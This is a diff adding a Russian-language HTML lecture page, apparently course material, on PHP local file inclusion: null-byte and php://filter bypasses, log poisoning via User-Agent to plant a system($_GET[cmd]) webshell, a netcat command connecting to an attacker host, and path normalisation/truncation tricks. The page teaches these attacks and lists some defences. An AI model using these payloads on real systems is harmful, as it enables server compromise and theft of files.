+				наличие фильтрации, которая будет подставлять в окончание строки расширение файла, например,
+				<strong>.php</strong>. Таким образом, при попытке включения в страницу файла <strong>/etc/passwd
+				</strong>мы получим в адресной строке <strong>file=/etc/passwd.php</strong>, а содержимое этого файла не
+				будет отображаться на странице, так как файла не существует. Но такой фильтр можно обойти с помощью так
+				называемого нулевого байта, который будет «отсекать» все, что будет идти после него. Дело в том, что вся
+				адресная строка при передаче HTTP-запроса кодируется в URL-encode, и в этой кодировке нулевой байт
+				выглядит как <strong>%00</strong>. Таким образом, строчка <strong>/etc/passwd%00.php </strong>будет
+				преобразована в <strong>/etc/passwd</strong>. Однако стоит отметить, что данная проблема является
+				довольно известной и исправлена в версии <strong>PHP 5.3+</strong></p>
+			<p id="f802a1ca-2668-41d5-94c3-21f40164299d" class="">Другой вариант обхода фильтрации — использование
+				<strong>php filter</strong>. В параметре, отвечающем за включение файлов, пишем не просто путь до файла,
+				который мы хотим включить, а путь до файла с использованием этой функции. Теперь запрос, который мы
+				будем отправлять, имеет вид:</p>
+			<p id="be3acc4a-e1e5-411f-9dd6-61d88eec0c61" class="">
+				<code>http://site.test.lan/index2.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code>
+			</p>
+			<p id="bf081c3b-f2fe-4520-adb2-b724cd6744a5" class="">И теперь на странице браузера мы увидим не содержимое
+				файла, а его исходник в кодировке <strong>base64</strong>, который можно декодировать.</p>
+			<p id="6d5ee63d-2545-4297-bec8-0b7bf49ee259" class="">С основными моментами уязвимости LFI разобрались, и
+				теперь понимаем, что при ее эксплуатации можно прочитать локальный файл на удаленном сервере. Но у LFI
+				есть интересная особенность, позволяющая не просто прочитать локальные файлы, а скомпрометировать
+				сервер.</p>
+			<h3 id="da1ed520-891d-443b-a4eb-814020a8ee7d" class="">Отравление журнала веб-сервера</h3>
+			<p id="ddf5d94b-198a-41cb-84f0-78d2f256b8a1" class="">Думаю, стоит сразу оговориться, что уязвимость не
+				новая, но тем не менее она до сих встречается и может представлять серьезную угрозу для безопасности
+				веб-сервера. При взаимодействии с веб-приложением любой наш запрос записывается в журналы веб-сервера,
+				как правило, это файлы <strong>/var/log/nginx/access.log </strong>или <strong>/var/log/nginx/error.log
+				</strong>если, например, используется веб-сервер <strong>Nginx</strong>, но названия конечных файлов,
+				разумеется, могут отличаться.</p>
+			<p id="980ed0ce-700f-4898-8f99-bc9a665f7279" class="">Теперь, составив специальный запрос, мы создадим
+				веб-шелл на сервере, записав его в <strong>access.log</strong>. Для отправки запроса будем использовать
+				инструмент Burp Suite, позволяющий в режиме реального времени перехватывать и редактировать запросы.</p>
+			<figure id="f0657c25-a633-4286-82a3-83989ff80b55" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%208.png"><img
+						style="width:768px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%208.png" /></a>
+			</figure>
+			<p id="0f2fbf65-fbcf-4fe7-b0c1-0c044d774831" class="">Наш веб-шелл <strong>&lt;?php system($_GET[cmd]);
+					?&gt; </strong>записан в журнале веб-сервера и готов к использованию.</p>
+			<p id="bc4d41d3-20c9-4127-ac75-e0876336f5f7" class="">Почему использовался именно параметр
+				<strong>User-Agent</strong>? Как уже говорилось ранее, адресная строка кодирует информацию с помощью
+				URL-encode, поэтому для передачи php-кода нужно использовать заголовки, а так как в <strong>access.log
+				</strong>точно пишется User-Agent, то и используем его. Обратившись к нашему веб-шеллу, получаем
+				возможность выполнять различные команды через параметр <strong>cmd</strong>:</p>
+			<p id="20c3fbb4-7096-4d1a-8674-7d9c718c6599" class="">
+				<code>http://site.test.lan/index2.php?file=/var/log/nginx/access.log&amp;cmd=ls /</code></p>
+			<p id="3b5bc473-52af-48ba-a896-09a5a532297c" class="">В чем отличие? LFI позволяет включать файл на сервере,
+				но необходимо указать полный путь до этого файла, то есть знать, где этот файл находится. Во втором
+				случае выполняется команда на самом сервере, а результат отображается в веб-приложении.</p>
+			<p id="030d786f-136b-4cdd-9be0-e1810036029e" class="">Убедившись, что мы можем выполнять различные команды
+				на сервере, переходим к получению доступа на него. Для этого указываем в параметре <strong>cmd
+				</strong>команду запуска <strong>Netcat </strong>для связи с сервером атакующего, то есть с нами:</p>
+			<p id="135682be-5829-4e86-b6ee-97a96bbf9c54" class="">
+				<code>http://site.test.lan/index2.php?file=/var/log/nginx/access.log&amp;cmd=nc 192.168.0.135 4455</code>
+			</p>
+			<figure id="7984ab54-3026-4d69-827a-cf7dff1a370b" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%209.png"><img
+						style="width:480px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%209.png" /></a>
+			</figure>
+			<p id="6560c6f0-4fc5-4110-8b7b-8baa897b447b" class=""><strong>Рекомендации</strong></p>
+			<ul id="ad3ed8af-5e35-4abe-8cfc-2d6255f8613f" class="bulleted-list">
+				<li style="list-style-type:disc">регулярно проверять безопасность веб-приложения с целью предотвращения
+					возникновения уязвимостей;</li>
+			</ul>
+			<ul id="43d361aa-bc98-4c45-9609-8c02f0fdced9" class="bulleted-list">
+				<li style="list-style-type:disc">добавить в журнал веб-сервера строчку <strong>&lt;?php exit(1);
+						?&gt;</strong>. Данный скрипт будет предотвращать любые попытки выполнения php-кода в этом
+					файле;</li>
+			</ul>
+			<ul id="9db51599-d783-4c7c-a92f-2357768821e3" class="bulleted-list">
+				<li style="list-style-type:disc">использовать средства защиты веб-приложений, например, WAF, который
+					будет блокировать вредоносный запрос, не позволяя его выполнить на веб-сервере.</li>
+			</ul>
+			<h2 id="459761a7-8d45-4929-aa9b-2712842459c5" class=""><strong>Альтернатива NULL-byte при LFI</strong></h2>
+			<p id="338b5d60-be58-4792-a750-fc4ef5da8115" class="">Уязвимость основана на двух особенностях в функциях
+				PHP для взаимодействия с файловой системой:</p>
+			<ol type="1" id="e977920f-b472-4133-b9c1-7875ef67916a" class="numbered-list" start="1">
+				<li><strong>Нормализация пути<br /><br /></strong>PHP обрабатывает строку, содержащую путь до файла или
+					папки, особым образом, в частности лишние символы “/” и “/.” удаляются.</li>
+			</ol>
+			<ol type="1" id="1577f808-e930-4a6d-b9f2-151f4a8b3c92" class="numbered-list" start="2">
+				<li><strong>Усечение пути<br /><br /></strong>PHP в зависимости от платформы имеет ограничение на длину
+					пути, определяемой константой MAX_PATH, в результате чего все символы, находящиеся за пределами
+					этого значения, отбрасываются.</li>
+			</ol>
+			<h3 id="872e55aa-8dd3-4d12-a4d8-dfb5d9117d68" class="">Нормализация пути</h3>
+			<p id="261ae057-035f-47d3-b626-c4fb714fb051" class="">Всем известно, что в PHP имеется большое количество
+				возможностей для быстрого и простого программирования. PHP способен совершать множество необходимых
+				действий самостоятельно, не обременяя разработчика лишними заботами. Такая направленность PHP однако
+				имеет и обратную сторону – возможно именно по причине излишней обработки путей возможна новая
+				уязвимость. Примеры нормализации пути:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="46cc218e-d523-4ba1-9a9f-791671fd9f1f" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+include(&#x27;/etc//passwd&#x27;); //работает
+include(&#x27;/etc///passwd&#x27;); //работает
+include(&#x27;/etc/./passwd&#x27;); //работает
+include(&#x27;/etc/passwd/.&#x27;); //работает
+include(&#x27;/etc/passwd/./.&#x27;); //работает
+?&gt;</code></pre>
+			<p id="ba695f1d-0575-46b0-96fc-e4f7538383bd" class="">Нормализация пути может быть использована атакующим
+				для обхода проверки расширения или имени файла в различных ситауциях, например при загрузке файлов или в
+				веб-приложении, реализующем преднамеренный просмотр своего исходного кода. Уязвимость имеет место при
+				неправильно реализованной проверке, которая основывается на принципе черного списка (blacklist), т.е.
+				веб-приложение сверяет данные со списком нежелательных значений. Например:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="053453c6-2d16-4e49-9f96-1ae44eae4f9d" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+$parts = pathinfo($_GET[&#x27;filename&#x27;]);
+$ext = $parts[&#x27;extension&#x27;];
+$blacklist = array(&#x27;php&#x27;, &#x27;phtml&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;);
+if(in_array($ext, $blacklist)) {
+	die(&#x27;Invalid input&#x27;);
+}
+?&gt;</code></pre>
+			<p id="f073cd90-4e63-4a75-9d60-d21d0aa2b78f" class="">Если в filename передать значение
+				“<code>file.php</code>”, то проверка сработает успешно, но если же добавить к этому значению
+				“<code><strong>/.</strong></code>“, то <code>pathinfo()</code> вернет неверный массив, в котором элемент
+				“<code>dirname</code>” будет равен “<code>file.php</code>”.Причина уязвимости кроется в функции
+				<code>virtual_file_ex()</code> (TSRM/tsrm_virtual_cwd.c):</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="cbcbab99-3fdf-4dd3-835d-9dea8494b99f" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">tok=NULL;
+ptr = tsrm_strtok_r(path_copy, TOKENIZER_STRING, &amp;tok);
+while (ptr) {
+	ptr_length = strlen(ptr);
+	/* */
+	if (IS_DIRECTORY_UP(ptr, ptr_length)) {
+		/* */
+	} else if (!IS_DIRECTORY_CURRENT(ptr, ptr_length)) {
+		/* */
+	}
+	ptr = tsrm_strtok_r(NULL, TOKENIZER_STRING, &amp;tok);
+}</code></pre>
+			<p id="fc2a96c8-e634-4acd-824e-2d0f6d6346ce" class="">Путь разбивается на части символом, значение которого
+				хранится в <code>TOKENIZER_STRING</code>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="bba34ce1-1ac8-4b87-9b8d-8f9e5164cd61" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#define TOKENIZER_STRING &quot;/\\&quot; // Win32
+#define TOKENIZER_STRING &quot;/\\&quot; // NETWARE
+#define TOKENIZER_STRING &quot;/&quot; // other (*nix)</code></pre>
+			<p id="40112e56-6857-49a5-a7fe-99e779e387f8" class="">Затем в цикле каждая часть проверяется на соответствие
+				с <code>IS_DIRECTORY_UP</code> и <code>IS_DIRECTORY_CURRENT</code>, значения которых определены так:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="4c73f4bc-061a-4d37-9ea8-65f32b34bc9e" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#define IS_DIRECTORY_UP(element, len) \
+    (len &gt;= 2 &amp;&amp; !php_check_dots(element, len))
+#define IS_DIRECTORY_CURRENT(element, len) \
+    (len == 1 &amp;&amp; element[0] == &#x27;.&#x27;)</code></pre>
+			<p id="663e5913-267a-426e-a63a-a27e34e431ac" class="">Таким образом, каждая часть пути, разделенная на
+				<code>TOKENIZER_STRING</code>, анализируется в цикле с помощью нехитрых проверок, при чем ни одна из них
+				не вызывает ошибку, что в конечном счете приводит к уязвимости, так как все нейтральные
+				“<code>./</code>” убираются.Стоит отметить, что простая последовательность из символов “<code>/</code>”,
+				стоящая в конце пути, не приведет к желаемому результату, если используется “чистый” PHP без всяких
+				патчей. Однако PHP с <strong>Suhosin patch</strong> будет принимать такие значения:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="60c07c90-4945-49e8-8a57-ef9bb534b7c9" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+include(&#x27;/etc/passwd///&#x27;);
+?&gt;</code></pre>
+			<p id="40960546-0365-4557-8923-89e7471bc17c" class="">Все дело в том, что <strong>Suhosin patch</strong>
+				заменяет функцию <code>realpath()</code>, отсюда возникают расхождения. Патч полностью убирает
+				замыкающие символы “<code>/</code>”, в то время как стандартный PHP преобразует все дополнительные
+				символы “<code>/</code>” в один, что сделает имя файла неправильным. Тем не менее, одиночные символы
+				“<code>/</code>.” или их последовательность будут работать на любой установке PHP.</p>
+			<h3 id="52e5036e-a660-46ec-829d-434c94ac2aef" class="">Усечение пути</h3>
+			<p id="9cb8346f-e491-4035-ab21-e109ba6ff0cc" class="">Вторая особенность, позволяющая говорить о новой
+				уязвимости в PHP, – это автоматическое усечение длины пути подобно тому, как это происходит в MySQL с
+				ограниченными по длине колонками. Благодаря этому, в локальных инклудах NULL-байт может быть заменен на
+				последовательность символов, состоящих из “<code>/</code>”, “<code>./</code>”, “<code>/.</code>” и
+				других. Например имеется следующий уязвимый скрипт:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="5b64ddf5-95e2-4c5f-8fac-71dafb91a6a3" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+// magic_quotes_gpc=on
+include(&#x27;includes/&#x27;.$_GET[&#x27;act&#x27;].&#x27;.php&#x27;);
+?&gt;</code></pre>
+			<p id="7f87ac71-9ed5-4a29-9ab7-b49c06ff41c1" class="">Это классическая LFI-уязвимость. В данном примере
+				атакующий может изменять центральную часть аргумента функции <code>include()</code>, поэтому проведение
+				RFI (remote file include) является невозможным, так как для этого необходимо контролировать начало
+				значения для указания протокола передачи данных (http, ftp, data, etc). Для реализации локального
+				инклуда атакующий может внедрить произвольный PHP-код в файловую систему сервера для дальнейшего его
+				выполнения через LFI. При этом очень часто требуется отбросить расширение файла, что обычно достигается
+				путем использования NULL-байта. Как известно, многие функции PHP, в частности <code>ereg(i)_*</code>,
+				<code>include</code>, <code>require</code>, <code>etc</code> не являются бинарно безопасными, т.е. как и
+				в C/C++, NULL-байт будет интерпретироваться как конец строки. Использование NULL-байта затрудняется тем,
+				что включенная директива <code>magic_quotes_gpc</code>, а также применение функции
+				<code>addslashes()</code> экранируют нулевой символ, что существенно сокращает поле его применения.</p>
+			<p id="8d203485-fe40-47d5-8dad-8403a5dbad93" class="">Пример LFI-вектора с NULL-байтом:</p>
+			<p id="d8568cf3-92bc-4d81-9645-6d023bcbf4b0" class="">
+				<code><strong>index.php?act=../../../../../etc/passwd%00</strong></code></p>
+			<p id="1665c288-6af6-42fd-b7da-bc407fe8e19e" class="">После экранирования в <code>include()</code> попадет
+				значение “<strong>includes/../../../../../etc/passwd \0.php</strong>”.</p>
+			<p id="90bdf70e-a193-4f9f-8ba8-bb26ab302b7f" class="">Новый вектор способен предоставить полноценную
+				альтернативу NULL-байту:</p>
+			<p id="16ccb000-694a-4069-9e2f-ec92bf7a6634" class="">
+				<code><strong>index.php?act=../../../../../etc/passwd/////[…]/////</strong></code></p>
+			<p id="55eceab8-2c19-4e5c-90cb-98ba42604aa7" class="">Количество символов “<code>/</code>” отличается на
+				разных платформах, но в большинстве случаев максимальная длина полного пути (т.е. после преобразования
+				относительного в абсолютный путь) равна 4096 байт. Само усечение пути выполняется в
+				<strong>main/streams/plain_wrapper.c</strong> и <strong>main/fopen_wrappers.c</strong> неправильным
+				вызовом <code>snprintf()</code>:</p>
+			<p id="5700e866-fbe9-4c00-ac49-b168039cd1b1" class="">
+				<code><strong>snprintf(trypath, MAXPATHLEN, &quot;%s/%s&quot;, ptr, filename);</strong></code></p>
+			<p id="f5d987ae-3f65-43b4-92af-979915ab9dd7" class="">Как и в MySQL, PHP без всяких вопросов и
+				предупреждений обрезает строку, длина которой становится равной MAXPATHLEN. Значение MAXPATHLEN
+				определяется так:<br /><br /><strong>/main/php.h</strong>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="5dd1f462-fd52-48d4-87f0-15248706d015" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#ifndef MAXPATHLEN
+# ifdef PATH_MAX
+# define MAXPATHLEN PATH_MAX
+# elif defined(MAX_PATH)
+# define MAXPATHLEN MAX_PATH
+# else
+# define MAXPATHLEN 256
+# endif
+#endif</code></pre>
+			<p id="0f55b947-da48-419b-a157-d442dfa22d2f" class=""><strong>/win32/param.h</strong>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="be45daef-66de-4561-99af-4447b8173aae" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#ifndef MAXPATHLEN
+# define MAXPATHLEN _MAX_PATH
+#endif</code></pre>
+			<p id="41c462d7-308c-4cc4-83f0-9cf65a93b59e" class="">Усечение пути в сочетании с нормализацией пути
+				позволяет заменить NULL-байт для установок PHP с включенным <strong>magic_quotes_gpc</strong>.
+				Последовательность после желаемого пути может состоять из символов “<code>/</code>”, “<code>/.</code>”,
+				“<code>./</code>”; в win32 этот список гораздо шире: <code>0x20</code> (пробел), <code>0x22</code> (“),
+				<code>0x2E</code> (.), <code>0x3c</code> (&lt;), <code>0x3e</code> (&gt;), <code>0x5c</code> (\).
+				Следует заметить, что в стандартных сборках PHP для удачной реализации уязвимости последним символом
+				пути должна быть точка. Что касается символа “<code>/</code>”, то его нормализация происходит на всех
+				платформах, но в стандартной сборке PHP последовательность из слэшей преобразуется в один, поэтому очень
+				часто его применение может быть невозможно. Однако по утверждениям Стефана Эссера использовать слэш в
+				атаках можно на любых *bsd платформах, даже без Suhosin patch. По собственным наблюдениям могу
+				предположить, что на всех *bsd-серверах длина последовательности составляет 1024 байта, в то время как
+				на linux эта цифра в четыре раза больше. В windows была замечена самая короткая последовательность – не
+				более 270 байт.</p>
+			<p id="5c315192-7f45-403e-9e0f-3890b09a10f6" class="">Угулублясь в исходный код PHP, становится очевиным,
+				что уязвимость обязана своему существованию такой директиве конфигурации PHP как
+				<strong>include_path</strong>, которая представляет собой аналог PATH на unix-системах. Всякий раз когда
+				вызывается <code>include()</code> или <code>require()</code> с относительным путем в качестве аргумента,
+				PHP производит попытки чтения файлов, последовательно подставляя папки, разделенных символов
+				“<code>:</code>”, из значения директивы. По умолчанию <code>include_path</code> равен “<code>.:</code>”,
+				но обычно в это значение добавляется еще несколько путей до различных библиотек, PEAR и прочего. В ходе
+				исследований команды <strong>USH</strong> выяснилось, что условием удачной атаки является наличие хотя
+				бы одного абсолютного пути в значении <strong>include_path</strong>.</p>
+			<h3 id="af6607f1-6f58-4e86-8cc1-471411b33cde" class="">Итоги</h3>
+			<p id="3a833b41-a179-4e80-9e22-801b92400654" class="">Особенности PHP при обработке путей позволяют выделить
+				новую уязвимость в популярном языке программирования веб-приложений. С помощью нее становится возможным
+				осуществление обхода запрещенных расширений или имен файлов. Кроме того, нормализация пути вкупе с
+				усечением дают новую альтернативу NULL-байту при проведении локальных инклудов. При этом универсальным
+				вектором атаки для *nix является последовательность из символов “<code>/.</code>”, а для windows –
+				“<code>.</code>”. Условия реализации атаки могут варьироваться в зависимости от конкретного сервера, в
+				частности от платформы и конфигурации PHP. Известными условиями являются:</p>
+			<ul id="e9e02708-71b8-480a-b4b5-adac490d5bbf" class="bulleted-list">
+				<li style="list-style-type:disc">в стандартных сборках PHP последним символом пути должна быть точка
+				</li>
+			</ul>
+			<ul id="a677b969-607f-4ede-825e-a3edf46a9d79" class="bulleted-list">
+				<li style="list-style-type:disc">include_path должен содержать абсолютный путь</li>
+			</ul>
+			<ul id="44663a80-7a87-481c-8bf2-9b0e9e3bf0b0" class="bulleted-list">
+				<li style="list-style-type:disc">вектор атаки для метода GET должен умещаться в пределы максимальной
+					принимаемой веб-сервером длины URL</li>
+			</ul>
+		</div>
+	</article><span class="sans" style="font-size:14px;padding-top:2em"></span>
+</body>
+
+</html>
